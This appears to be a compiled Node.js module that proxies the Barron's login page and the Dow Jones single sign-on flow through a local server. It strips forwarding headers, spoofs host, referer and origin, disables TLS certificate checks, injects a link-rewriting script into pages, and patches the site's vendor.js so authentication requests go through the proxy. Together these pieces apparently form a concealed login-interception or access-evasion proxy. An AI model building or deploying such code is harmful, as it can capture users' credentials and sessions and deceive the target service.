"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.delegateLoginPageRequest = void 0;
const https_1 = __importDefault(require("https"));
const parse_1 = require("../parse");
const inject_1 = require("../inject");
const serverDomain = 'localhost:3002';
const serverUrl = 'http://' + serverDomain;
const apiUrl = 'http://localhost:3003';
const delegateLoginPageRequest = (req, res, domain) => {
    const { method, headers, url, path } = req;
    // console.log(url,path)
    delete headers['x-forwarded-for'];
    delete headers['x-forwarded-host'];
    delete headers['x-forwarded-proto'];
    delete headers['via'];
    delete headers['forwarded'];
    // Устанавливаем стандартные заголовки браузера
    headers['host'] = domain;
    headers['referer'] = 'https://' + domain + '/';
    headers['origin'] = 'https://' + domain;
    // Добавляем случайный User-Agent, если его нет
    if (!headers['user-agent']) {
        headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    }
    const options = {
        hostname: domain,
        path: url,
        method,
        headers,
        port: 443,
        rejectUnauthorized: false
    };
    // console.log(headers)
    try {
        const proxyRequest = https_1.default.request(options, (response) => {
            // console.log(response.headers)
            delete response.headers['content-length'];
            delete response.headers['x-powered-by'];
            delete response.headers['server'];
            console.log(response.headers['content-type'], response.headers['content-encoding']);
            if (response.headers['content-type'] === 'text/html' && response.headers['content-encoding'] === 'gzip') {
                console.log(response.headers['content-encoding'], 222444422);
                delete response.headers['content-encoding'];
                (0, parse_1.gzipParse)(response).then(data => {
                    res.writeHead(response.statusCode || 500, response.headers);
                    let htmlBuffer = (0, inject_1.inject)(data, `
                        <script>
                        setInterval(()=>{
                            document.querySelectorAll('a').forEach(el=>{
                                el.href  = el.href.replace('https://www.barrons.com','')
                            })
                        },1000)
                        </script>
                    `);
                    htmlBuffer = (0, inject_1.replace)(htmlBuffer, 'https://www.barrons.com', serverUrl, true);
                    htmlBuffer = (0, inject_1.replace)(htmlBuffer, 'www.barrons.com', serverUrl, true);
                    htmlBuffer = (0, inject_1.replace)(htmlBuffer, 'https://api.barrons.com', apiUrl, true);
                    res.write(htmlBuffer);
                    res.end();
                    response.on('error', (error) => {
                        console.error('Response stream error:', error);
                        res.status(500).end('Internal Server Error');
                    });
                });
            }
            else if (req.url.includes('vendor.js')) {
                (0, parse_1.brotlieParse)(response).then(data => {
                    try {
                        delete response.headers['content-encoding'];
                        delete response.headers['content-length'];
                        let cloneForData = (0, inject_1.replace)(data, 'O.open(u.method.toUpperCase(),u.url,!0)', `O.open(u.method.toUpperCase(),(()=>{console.log(u);return u.url.replace("https://sso.accounts.dowjones.com",'')})(), !0)`);
                        res.writeHead(response.statusCode || 500, response.headers);
                        console.log(cloneForData);
                        res.write(cloneForData.toString());
                        res.end();
                    }
                    catch (error) {
                        res.writeHead(response.statusCode || 500, response.headers);
                        response.pipe(res);
                    }
                });
            }
            else {
                res.writeHead(response.statusCode || 500, response.headers);
                response.pipe(res);
                response.on('error', (error) => {
                    console.error('Response stream error:', error);
                    res.status(500).end('Internal Server Error');
                });
            }
        });
        req.on('aborted', () => {
            proxyRequest.destroy();
        });
        req.pipe(proxyRequest);
        req.on('error', (e) => {
            console.log(e);
        });
    }
    catch (error) {
        console.log(error);
    }
};
exports.delegateLoginPageRequest = delegateLoginPageRequest;
